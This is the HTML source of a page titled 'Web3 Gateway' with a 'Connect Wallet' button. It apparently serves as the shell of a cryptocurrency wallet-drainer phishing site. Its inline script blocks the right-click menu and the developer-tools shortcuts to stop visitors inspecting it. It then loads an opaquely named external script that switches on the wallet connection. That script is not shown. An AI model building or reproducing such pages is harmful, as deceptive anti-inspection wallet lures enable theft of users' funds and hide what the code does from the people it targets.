<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Web3 Gateway</title>

    <!-- Inline critical CSS -->
    <style>
      /* [Keep existing styles] */
      /* Add will-change for hardware acceleration */
      .content-wrapper {
        will-change: transform;
      }
    </style>

    <!-- Preload critical resources with modern formats -->
    <link rel="preload" href="./background_1.avif" as="image" type="image/avif">
    <link rel="preload" href="./banner.avif" as="image" type="image/avif">
  </head>

  <body>
    <header>
      <!-- Use modern AVIF format for faster loading -->
      <img src="./banner.avif" alt="Site Logo" class="logo-banner" loading="eager" width="200" height="40">
      <!-- Add disabled state while loading -->
      <button class="open" aria-label="Connect Wallet" id="connectButton" disabled>
        <span class="button-text">Connect Wallet</span>
        <span class="loading-dots" aria-hidden="true"></span>
      </button>
    </header>

    <div class="content-wrapper" role="main"></div>

    <!-- Optimized script loading -->
    <script>
      // Basic anti-inspection measures (note: not foolproof)
      document.addEventListener('contextmenu', e => e.preventDefault());
      document.onkeydown = (e) => {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
          e.preventDefault();
        }
      };

      // Load Web3 script with proper error handling
      (function() {
        const script = document.createElement('script');
        script.src = './67be024a7259dcef4dee5ce5.js';
        script.defer = true;
        script.onload = () => {
          const btn = document.getElementById('connectButton');
          btn.disabled = false;
          btn.querySelector('.button-text').textContent = 'Connect Wallet';
          btn.querySelector('.loading-dots').style.display = 'none';
        };
        script.onerror = () => {
          console.error('Failed to load Web3 script');
          const btn = document.getElementById('connectButton');
          btn.disabled = true;
          btn.textContent = 'Connection Error';
        };
        document.head.appendChild(script);
      })();
    </script>

    <noscript>Please enable JavaScript to use this application</noscript>

    <!-- WebGL error mitigation -->
    <script>
      // WebGL context creation with error handling
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
        if (!gl) throw new Error('WebGL not supported');
      } catch (error) {
        console.warn('WebGL Error:', error.message);
        document.querySelector('.content-wrapper').style.backgroundImage = 
          "url('./fallback-background.jpg')";
      }
    </script>
  </body>
</html>
